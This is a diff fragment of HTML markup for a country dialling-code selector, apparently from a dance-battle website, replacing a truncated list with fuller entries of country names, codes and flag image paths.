-                                <div class="item" data-code="+1" data-lang="BS" data-name="Bahamas"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BS.png" alt="BS"> </div> <p class="name">Bahamas</p> <p class="code">+1</p> </div>
-                                <div class="item" data-code="+880" data-lang="BD" data-name="বাংলাদেশ"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BD.png" alt="BD"> </div> <p class="name">বাংলাদেশ</p> <p class="code">+880</p> </div>
-                                <div class="item" data-code="+1" data-lang="BB" data-name="Barbados"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BB.png" alt="BB"> </div> <p class="name">Barbados</p> <p class="code">+1</p> </div>
-                                <div class="item" data-code="+973" data-lang="BH" data-name="البحرين"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BH.png" alt="BH"> </div> <p class="name">البحرين</p> <p class="code">+973</p> </div>
-                                <div class="item" data-code="+375" data-lang="BY" data-name="Беларусь"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BY.png" alt="BY"> </div> <p class="name">Беларусь</p> <p class="code">+375</p> </div>
-                                <div class="item" data-code="+501" data-lang="BZ" data-name="Belize"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BZ.png" alt="BZ"> </div> <p class="name">Belize</p> <p class="code">+501</p> </div>
-                                <div class="item" data-code="+32" data-lang="BE" data-name="België"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BE.png" alt="BE"> </div> <p class="name">België</p> <p class="code">+32</p> </div>
-                                <div class="item" data-code="+229" data-lang="BJ" data-name="Bénin"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BJ.png" alt="BJ"> </div> <p class="name">Bénin</p> <p class="code">+229</p> </div>
-                                <div class="item" data-code="+1" data-lang="BM" data-name="Bermuda"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BM.png" alt="BM"> </div> <p class="name">Bermuda</p> <p class="code">+1</p> </div>
-                                <div class="item" data-code="+359" data-lang="BG" data-name="България"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BG.png" alt="BG"> </div> <p class="name">България</p> <p class="code">+359</p> </div>
-                                <!-- ... (и так далее для ВСЕХ стран) ... -->
-                                <div class="item" data-code="+81" data-lang="JP" data-name="日本"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/JP.png" alt="JP"> </div> <p class="name">日本</p> <p class="code">+81</p> </div>
+<!-- Конец Части 1 -->
+ <!-- *** НАЧАЛО БЛОКА С ИСПРАВЛЕННЫМИ ПУТЯМИ К ФЛАГАМ *** -->
+<div class="item" data-code="+61" data-lang="AU" data-name="Australia"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AU.png" alt="AU"> </div> <p class="name">Australia</p> <p class="code">+61</p> </div>
+<div class="item" data-code="+43" data-lang="AT" data-name="Österreich"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AT.png" alt="AT"> </div> <p class="name">Österreich</p> <p class="code">+43</p> </div>
+<div class="item" data-code="+994" data-lang="AZ" data-name="Azərbaycan"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AZ.png" alt="AZ"> </div> <p class="name">Azərbaycan</p> <p class="code">+994</p> </div>
+<div class="item" data-code="+358" data-lang="AX" data-name="Åland"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AX.png" alt="AX"> </div> <p class="name">Åland</p> <p class="code">+358</p> </div>
+<div class="item" data-code="+355" data-lang="AL" data-name="Shqipëri"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AL.png" alt="AL"> </div> <p class="name">Shqipëri</p> <p class="code">+355</p> </div>
+<div class="item" data-code="+213" data-lang="DZ" data-name="الجزائر"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/DZ.png" alt="DZ"> </div> <p class="name">الجزائر</p> <p class="code">+213</p> </div>
+<div class="item" data-code="+1" data-lang="AS" data-name="American Samoa"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AS.png" alt="AS"> </div> <p class="name">American Samoa</p> <p class="code">+1</p> </div>
+<div class="item" data-code="+1" data-lang="AI" data-name="Anguilla"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AI.png" alt="AI"> </div> <p class="name">Anguilla</p> <p class="code">+1</p> </div>
+<div class="item" data-code="+244" data-lang="AO" data-name="Angola"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AO.png" alt="AO"> </div> <p class="name">Angola</p> <p class="code">+244</p> </div>
+<div class="item" data-code="+376" data-lang="AD" data-name="Andorra"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AD.png" alt="AD"> </div> <p class="name">Andorra</p> <p class="code">+376</p> </div>
+<div class="item" data-code="+1" data-lang="AG" data-name="Antigua & Barbuda"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AG.png" alt="AG"> </div> <p class="name">Antigua & Barbuda</p> <p class="code">+1</p> </div>
+<div class="item" data-code="+54" data-lang="AR" data-name="Argentina"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AR.png" alt="AR"> </div> <p class="name">Argentina</p> <p class="code">+54</p> </div>
+<div class="item" data-code="+374" data-lang="AM" data-name="Հայաստան"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AM.png" alt="AM"> </div> <p class="name">Հայաստան</p> <p class="code">+374</p> </div>
+<div class="item" data-code="+297" data-lang="AW" data-name="Aruba"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AW.png" alt="AW"> </div> <p class="name">Aruba</p> <p class="code">+297</p> </div>
+<div class="item" data-code="+93" data-lang="AF" data-name="افغانستان"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AF.png" alt="AF"> </div> <p class="name">افغانستان</p> <p class="code">+93</p> </div>
+<div class="item" data-code="+1" data-lang="BS" data-name="Bahamas"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BS.png" alt="BS"> </div> <p class="name">Bahamas</p> <p class="code">+1</p> </div>
+<div class="item" data-code="+880" data-lang="BD" data-name="বাংলাদেশ"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BD.png" alt="BD"> </div> <p class="name">বাংলাদেশ</p> <p class="code">+880</p> </div>
+<div class="item" data-code="+1" data-lang="BB" data-name="Barbados"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BB.png" alt="BB"> </div> <p class="name">Barbados</p> <p class="code">+1</p> </div>
+<div class="item" data-code="+973" data-lang="BH" data-name="البحرين"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BH.png" alt="BH"> </div> <p class="name">البحرين</p> <p class="code">+973</p> </div>
+<div class="item" data-code="+375" data-lang="BY" data-name="Беларусь"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BY.png" alt="BY"> </div> <p class="name">Беларусь</p> <p class="code">+375</p> </div>
+<div class="item" data-code="+501" data-lang="BZ" data-name="Belize"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BZ.png" alt="BZ"> </div> <p class="name">Belize</p> <p class="code">+501</p> </div>
+<div class="item" data-code="+32" data-lang="BE" data-name="België"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BE.png" alt="BE"> </div> <p class="name">België</p> <p class="code">+32</p> </div>
+<div class="item" data-code="+229" data-lang="BJ" data-name="Bénin"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BJ.png" alt="BJ"> </div> <p class="name">Bénin</p> <p class="code">+229</p> </div>
+<div class="item" data-code="+1" data-lang="BM" data-name="Bermuda"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BM.png" alt="BM"> </div> <p class="name">Bermuda</p> <p class="code">+1</p> </div>
+<div class="item" data-code="+359" data-lang="BG" data-name="България"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BG.png" alt="BG"> </div> <p class="name">България</p> <p class="code">+359</p> </div>
+<div class="item" data-code="+591" data-lang="BO" data-name="Bolivia"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BO.png" alt="BO"> </div> <p class="name">Bolivia</p> <p class="code">+591</p> </div>
+<div class="item" data-code="+599" data-lang="BQ" data-name="Caribisch Nederland"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BQ.png" alt="BQ"> </div> <p class="name">Caribisch Nederland</p> <p class="code">+599</p> </div>
+<div class="item" data-code="+387" data-lang="BA" data-name="Bosna i Hercegovina"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BA.png" alt="BA"> </div> <p class="name">Bosna i Hercegovina</p> <p class="code">+387</p> </div>
+<div class="item" data-code="+267" data-lang="BW" data-name="Botswana"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BW.png" alt="BW"> </div> <p class="name">Botswana</p> <p class="code">+267</p> </div>
+<div class="item" data-code="+55" data-lang="BR" data-name="Brasil"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BR.png" alt="BR"> </div> <p class="name">Brasil</p> <p class="code">+55</p> </div>
+<div class="item" data-code="+246" data-lang="IO" data-name="British Indian Ocean Territory"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/IO.png" alt="IO"> </div> <p class="name">British Indian Ocean Territory</p> <p class="code">+246</p> </div>
+<div class="item" data-code="+673" data-lang="BN" data-name="Brunei"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BN.png" alt="BN"> </div> <p class="name">Brunei</p> <p class="code">+673</p> </div>
+<div class="item" data-code="+226" data-lang="BF" data-name="Burkina Faso"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BF.png" alt="BF"> </div> <p class="name">Burkina Faso</p> <p class="code">+226</p> </div>
+<div class="item" data-code="+257" data-lang="BI" data-name="Burundi"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BI.png" alt="BI"> </div> <p class="name">Burundi</p> <p class="code">+257</p> </div>
+<div class="item" data-code="+975" data-lang="BT" data-name="འབྲུག"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BT.png" alt="BT"> </div> <p class="name">འབྲུག</p> <p class="code">+975</p> </div>
+<div class="item" data-code="+678" data-lang="VU" data-name="Vanuatu"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/VU.png" alt="VU"> </div> <p class="name">Vanuatu</p> <p class="code">+678</p> </div>
+<div class="item" data-code="+379" data-lang="VA" data-name="Città del Vaticano"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/VA.png" alt="VA"> </div> <p class="name">Città del Vaticano</p> <p class="code">+379</p> </div>
+<div class="item" data-code="+44" data-lang="GB" data-name="United Kingdom"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/GB.png" alt="GB"> </div> <p class="name">United Kingdom</p> <p class="code">+44</p> </div>
+<div class="item" data-code="+36" data-lang="HU" data-name="Magyarország"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/HU.png" alt="HU"> </div> <p class="name">Magyarország</p> <p class="code">+36</p> </div>
+<div class="item" data-code="+58" data-lang="VE" data-name="Venezuela"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/VE.png" alt="VE"> </div> <p class="name">Venezuela</p> <p class="code">+58</p> </div>
+<div class="item" data-code="+1" data-lang="VG" data-name="British Virgin Islands"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/VG.png" alt="VG"> </div> <p class="name">British Virgin Islands</p> <p class="code">+1</p> </div>
+<div class="item" data-code="+1" data-lang="VI" data-name="U.S. Virgin Islands"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/VI.png" alt="VI"> </div> <p class="name">U.S. Virgin Islands</p> <p class="code">+1</p> </div>
+<div class="item" data-code="+670" data-lang="TL" data-name="Timor-Leste"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/TL.png" alt="TL"> </div> <p class="name">Timor-Leste</p> <p class="code">+670</p> </div>
+<div class="item" data-code="+84" data-lang="VN" data-name="Việt Nam"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/VN.png" alt="VN"> </div> <p class="name">Việt Nam</p> <p class="code">+84</p> </div>
+<div class="item" data-code="+241" data-lang="GA" data-name="Gabon"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/GA.png" alt="GA"> </div> <p class="name">Gabon</p> <p class="code">+241</p> </div>
+<div class="item" data-code="+509" data-lang="HT" data-name="Haïti"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/HT.png" alt="HT"> </div> <p class="name">Haïti</p> <p class="code">+509</p> </div>
+<div class="item" data-code="+592" data-lang="GY" data-name="Guyana"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/GY.png" alt="GY"> </div> <p class="name">Guyana</p> <p class="code">+592</p> </div>
+<div class="item" data-code="+220" data-lang="GM" data-name="Gambia"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/GM.png" alt="GM"> </div> <p class="name">Gambia</p> <p class="code">+220</p> </div>
+<div class="item" data-code="+233" data-lang="GH" data-name="Ghana"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/GH.png" alt="GH"> </div> <p class="name">Ghana</p> <p class="code">+233</p> </div>
+<div class="item" data-code="+590" data-lang="GP" data-name="Guadeloupe"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/GP.png" alt="GP"> </div> <p class="name">Guadeloupe</p> <p class="code">+590</p> </div>
+<div class="item" data-code="+502" data-lang="GT" data-name="Guatemala"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/GT.png" alt="GT"> </div> <p class="name">Guatemala</p> <p class="code">+502</p> </div>
+<div class="item" data-code="+224" data-lang="GN" data-name="Guinée"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/GN.png" alt="GN"> </div> <p class="name">Guinée</p> <p class="code">+224</p> </div>
+<div class="item" data-code="+245" data-lang="GW" data-name="Guiné-Bissau"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/GW.png" alt="GW"> </div> <p class="name">Guiné-Bissau</p> <p class="code">+245</p> </div>
+<div class="item" data-code="+49" data-lang="DE" data-name="Deutschland"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/DE.png" alt="DE"> </div> <p class="name">Deutschland</p> <p class="code">+49</p> </div>
+<div class="item" data-code="+44" data-lang="GG" data-name="Guernsey"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/GG.png" alt="GG"> </div> <p class="name">Guernsey</p> <p class="code">+44</p> </div>
+<div class="item" data-code="+350" data-lang="GI" data-name="Gibraltar"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/GI.png" alt="GI"> </div> <p class="name">Gibraltar</p> <p class="code">+350</p> </div>
+<div class="item" data-code="+504" data-lang="HN" data-name="Honduras"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/HN.png" alt="HN"> </div> <p class="name">Honduras</p> <p class="code">+504</p> </div>
+<div class="item" data-code="+852" data-lang="HK" data-name="中國香港特別行政區"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/HK.png" alt="HK"> </div> <p class="name">中國香港特別行政區</p> <p class="code">+852</p> </div>
+<div class="item" data-code="+1" data-lang="GD" data-name="Grenada"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/GD.png" alt="GD"> </div> <p class="name">Grenada</p> <p class="code">+1</p> </div>
+<div class="item" data-code="+299" data-lang="GL" data-name="Kalaallit Nunaat"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/GL.png" alt="GL"> </div> <p class="name">Kalaallit Nunaat</p> <p class="code">+299</p> </div>
+<div class="item" data-code="+30" data-lang="GR" data-name="Ελλάδα"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/GR.png" alt="GR"> </div> <p class="name">Ελλάδα</p> <p class="code">+30</p> </div>
+<div class="item" data-code="+995" data-lang="GE" data-name="საქართველო"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/GE.png" alt="GE"> </div> <p class="name">საქართველო</p> <p class="code">+995</p> </div>
+<div class="item" data-code="+1" data-lang="GU" data-name="Guam"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/GU.png" alt="GU"> </div> <p class="name">Guam</p> <p class="code">+1</p> </div>
+<div class="item" data-code="+45" data-lang="DK" data-name="Danmark"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/DK.png" alt="DK"> </div> <p class="name">Danmark</p> <p class="code">+45</p> </div>
+<div class="item" data-code="+44" data-lang="JE" data-name="Jersey"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/JE.png" alt="JE"> </div> <p class="name">Jersey</p> <p class="code">+44</p> </div>
+<div class="item" data-code="+253" data-lang="DJ" data-name="Djibouti"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/DJ.png" alt="DJ"> </div> <p class="name">Djibouti</p> <p class="code">+253</p> </div>
+<div class="item" data-code="+1" data-lang="DM" data-name="Dominica"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/DM.png" alt="DM"> </div> <p class="name">Dominica</p> <p class="code">+1</p> </div>
+<div class="item" data-code="+1" data-lang="DO" data-name="República Dominicana"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/DO.png" alt="DO"> </div> <p class="name">República Dominicana</p> <p class="code">+1</p> </div>
+<div class="item" data-code="+20" data-lang="EG" data-name="مصر"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/EG.png" alt="EG"> </div> <p class="name">مصر</p> <p class="code">+20</p> </div>
+<div class="item" data-code="+260" data-lang="ZM" data-name="Zambia"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/ZM.png" alt="ZM"> </div> <p class="name">Zambia</p> <p class="code">+260</p> </div>
+<div class="item" data-code="+263" data-lang="ZW" data-name="Zimbabwe"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/ZW.png" alt="ZW"> </div> <p class="name">Zimbabwe</p> <p class="code">+263</p> </div>
+<div class="item" data-code="+972" data-lang="IL" data-name="ישראל"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/IL.png" alt="IL"> </div> <p class="name">ישראל</p> <p class="code">+972</p> </div>
+<div class="item" data-code="+91" data-lang="IN" data-name="India"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/IN.png" alt="IN"> </div> <p class="name">India</p> <p class="code">+91</p> </div>
+<div class="item" data-code="+62" data-lang="ID" data-name="Indonesia"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/ID.png" alt="ID"> </div> <p class="name">Indonesia</p> <p class="code">+62</p> </div>
+<div class="item" data-code="+962" data-lang="JO" data-name="الأردن"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/JO.png" alt="JO"> </div> <p class="name">الأردن</p> <p class="code">+962</p> </div>
+<div class="item" data-code="+964" data-lang="IQ" data-name="العراق"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/IQ.png" alt="IQ"> </div> <p class="name">العراق</p> <p class="code">+964</p> </div>
+<div class="item" data-code="+98" data-lang="IR" data-name="ایران"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/IR.png" alt="IR"> </div> <p class="name">ایران</p> <p class="code">+98</p> </div>
+<div class="item" data-code="+353" data-lang="IE" data-name="Ireland"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/IE.png" alt="IE"> </div> <p class="name">Ireland</p> <p class="code">+353</p> </div>
+<div class="item" data-code="+354" data-lang="IS" data-name="Ísland"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/IS.png" alt="IS"> </div> <p class="name">Ísland</p> <p class="code">+354</p> </div>
+<div class="item" data-code="+34" data-lang="ES" data-name="España"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/ES.png" alt="ES"> </div> <p class="name">España</p> <p class="code">+34</p> </div>
+<div class="item" data-code="+39" data-lang="IT" data-name="Italia"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/IT.png" alt="IT"> </div> <p class="name">Italia</p> <p class="code">+39</p> </div>
+<div class="item" data-code="+967" data-lang="YE" data-name="اليمن"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/YE.png" alt="YE"> </div> <p class="name">اليمن</p> <p class="code">+967</p> </div>
+<div class="item" data-code="+238" data-lang="CV" data-name="Cabo Verde"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/CV.png" alt="CV"> </div> <p class="name">Cabo Verde</p> <p class="code">+238</p> </div>
+<div class="item" data-code="+7" data-lang="KZ" data-name="Қазақстан"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/KZ.png" alt="KZ"> </div> <p class="name">Қазақстан</p> <p class="code">+7</p> </div>
+<div class="item" data-code="+855" data-lang="KH" data-name="កម្ពុជា"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/KH.png" alt="KH"> </div> <p class="name">កម្ពុជា</p> <p class="code">+855</p> </div>
+<div class="item" data-code="+237" data-lang="CM" data-name="Cameroon"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/CM.png" alt="CM"> </div> <p class="name">Cameroon</p> <p class="code">+237</p> </div>
+<div class="item" data-code="+1" data-lang="CA" data-name="Canada"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/CA.png" alt="CA"> </div> <p class="name">Canada</p> <p class="code">+1</p> </div>
+<div class="item" data-code="+974" data-lang="QA" data-name="قطر"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/QA.png" alt="QA"> </div> <p class="name">قطر</p> <p class="code">+974</p> </div>
+<div class="item" data-code="+254" data-lang="KE" data-name="Kenya"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/KE.png" alt="KE"> </div> <p class="name">Kenya</p> <p class="code">+254</p> </div>
+<div class="item" data-code="+357" data-lang="CY" data-name="Κύπρος"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/CY.png" alt="CY"> </div> <p class="name">Κύπρος</p> <p class="code">+357</p> </div>
+<div class="item" data-code="+996" data-lang="KG" data-name="Кыргызстан"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/KG.png" alt="KG"> </div> <p class="name">Кыргызстан</p> <p class="code">+996</p> </div>
+<div class="item" data-code="+686" data-lang="KI" data-name="Kiribati"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/KI.png" alt="KI"> </div> <p class="name">Kiribati</p> <p class="code">+686</p> </div>
+<div class="item" data-code="+86" data-lang="CN" data-name="中国"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/CN.png" alt="CN"> </div> <p class="name">中国</p> <p class="code">+86</p> </div>
+<div class="item" data-code="+850" data-lang="KP" data-name="조선민주주의인민공화국"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/KP.png" alt="KP"> </div> <p class="name">조선민주주의인민공화국</p> <p class="code">+850</p> </div>
+<div class="item" data-code="+61" data-lang="CC" data-name="Kepulauan Cocos (Keeling)"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/CC.png" alt="CC"> </div> <p class="name">Kepulauan Cocos (Keeling)</p> <p class="code">+61</p> </div>
+<div class="item" data-code="+57" data-lang="CO" data-name="Colombia"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/CO.png" alt="CO"> </div> <p class="name">Colombia</p> <p class="code">+57</p> </div>
+<div class="item" data-code="+269" data-lang="KM" data-name="جزر القمر"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/KM.png" alt="KM"> </div> <p class="name">جزر القمر</p> <p class="code">+269</p> </div>
+<div class="item" data-code="+242" data-lang="CG" data-name="Congo-Brazzaville"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/CG.png" alt="CG"> </div> <p class="name">Congo-Brazzaville</p> <p class="code">+242</p> </div>
+<div class="item" data-code="+243" data-lang="CD" data-name="Congo-Kinshasa"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/CD.png" alt="CD"> </div> <p class="name">Congo-Kinshasa</p> <p class="code">+243</p> </div>
+<div class="item" data-code="+383" data-lang="XK" data-name="Kosovë"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/XK.png" alt="XK"> </div> <p class="name">Kosovë</p> <p class="code">+383</p> </div>
+<div class="item" data-code="+506" data-lang="CR" data-name="Costa Rica"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/CR.png" alt="CR"> </div> <p class="name">Costa Rica</p> <p class="code">+506</p> </div>
+<div class="item" data-code="+225" data-lang="CI" data-name="Côte d’Ivoire"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/CI.png" alt="CI"> </div> <p class="name">Côte d’Ivoire</p> <p class="code">+225</p> </div>
+<div class="item" data-code="+53" data-lang="CU" data-name="Cuba"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/CU.png" alt="CU"> </div> <p class="name">Cuba</p> <p class="code">+53</p> </div>
+<div class="item" data-code="+965" data-lang="KW" data-name="الكويت"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/KW.png" alt="KW"> </div> <p class="name">الكويت</p> <p class="code">+965</p> </div>
+<div class="item" data-code="+599" data-lang="CW" data-name="Curaçao"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/CW.png" alt="CW"> </div> <p class="name">Curaçao</p> <p class="code">+599</p> </div>
+<div class="item" data-code="+856" data-lang="LA" data-name="ລາວ"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/LA.png" alt="LA"> </div> <p class="name">ລາວ</p> <p class="code">+856</p> </div>
+<div class="item" data-code="+371" data-lang="LV" data-name="Latvija"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/LV.png" alt="LV"> </div> <p class="name">Latvija</p> <p class="code">+371</p> </div>
+<div class="item" data-code="+266" data-lang="LS" data-name="Lesotho"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/LS.png" alt="LS"> </div> <p class="name">Lesotho</p> <p class="code">+266</p> </div>
+<div class="item" data-code="+231" data-lang="LR" data-name="Liberia"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/LR.png" alt="LR"> </div> <p class="name">Liberia</p> <p class="code">+231</p> </div>
+<div class="item" data-code="+961" data-lang="LB" data-name="لبنان"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/LB.png" alt="LB"> </div> <p class="name">لبنان</p> <p class="code">+961</p> </div>
+<div class="item" data-code="+218" data-lang="LY" data-name="ليبيا"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/LY.png" alt="LY"> </div> <p class="name">ليبيا</p> <p class="code">+218</p> </div>
+<div class="item" data-code="+370" data-lang="LT" data-name="Lietuva"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/LT.png" alt="LT"> </div> <p class="name">Lietuva</p> <p class="code">+370</p> </div>
+<div class="item" data-code="+423" data-lang="LI" data-name="Liechtenstein"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/LI.png" alt="LI"> </div> <p class="name">Liechtenstein</p> <p class="code">+423</p> </div>
+<div class="item" data-code="+352" data-lang="LU" data-name="Lëtzebuerg"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/LU.png" alt="LU"> </div> <p class="name">Lëtzebuerg</p> <p class="code">+352</p> </div>
+<div class="item" data-code="+230" data-lang="MU" data-name="Mauritius"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/MU.png" alt="MU"> </div> <p class="name">Mauritius</p> <p class="code">+230</p> </div>
+<div class="item" data-code="+222" data-lang="MR" data-name="موريتانيا"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/MR.png" alt="MR"> </div> <p class="name">موريتانيا</p> <p class="code">+222</p> </div>
+<div class="item" data-code="+261" data-lang="MG" data-name="Madagascar"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/MG.png" alt="MG"> </div> <p class="name">Madagascar</p> <p class="code">+261</p> </div>
+<div class="item" data-code="+262" data-lang="YT" data-name="Mayotte"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/YT.png" alt="YT"> </div> <p class="name">Mayotte</p> <p class="code">+262</p> </div>
+<div class="item" data-code="+853" data-lang="MO" data-name="中國澳門特別行政區"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/MO.png" alt="MO"> </div> <p class="name">中國澳門特別行政區</p> <p class="code">+853</p> </div>
+<div class="item" data-code="+265" data-lang="MW" data-name="Malawi"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/MW.png" alt="MW"> </div> <p class="name">Malawi</p> <p class="code">+265</p> </div>
+<div class="item" data-code="+60" data-lang="MY" data-name="Malaysia"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/MY.png" alt="MY"> </div> <p class="name">Malaysia</p> <p class="code">+60</p> </div>
+<div class="item" data-code="+223" data-lang="ML" data-name="Mali"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/ML.png" alt="ML"> </div> <p class="name">Mali</p> <p class="code">+223</p> </div>
+<div class="item" data-code="+960" data-lang="MV" data-name="Maldives"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/MV.png" alt="MV"> </div> <p class="name">Maldives</p> <p class="code">+960</p> </div>
+<div class="item" data-code="+356" data-lang="MT" data-name="Malta"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/MT.png" alt="MT"> </div> <p class="name">Malta</p> <p class="code">+356</p> </div>
+<div class="item" data-code="+212" data-lang="MA" data-name="المغرب"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/MA.png" alt="MA"> </div> <p class="name">المغرب</p> <p class="code">+212</p> </div>
+<div class="item" data-code="+596" data-lang="MQ" data-name="Martinique"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/MQ.png" alt="MQ"> </div> <p class="name">Martinique</p> <p class="code">+596</p> </div>
+<div class="item" data-code="+692" data-lang="MH" data-name="Marshall Islands"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/MH.png" alt="MH"> </div> <p class="name">Marshall Islands</p> <p class="code">+692</p> </div>
+<div class="item" data-code="+52" data-lang="MX" data-name="México"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/MX.png" alt="MX"> </div> <p class="name">México</p> <p class="code">+52</p> </div>
+<div class="item" data-code="+258" data-lang="MZ" data-name="Moçambique"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/MZ.png" alt="MZ"> </div> <p class="name">Moçambique</p> <p class="code">+258</p> </div>
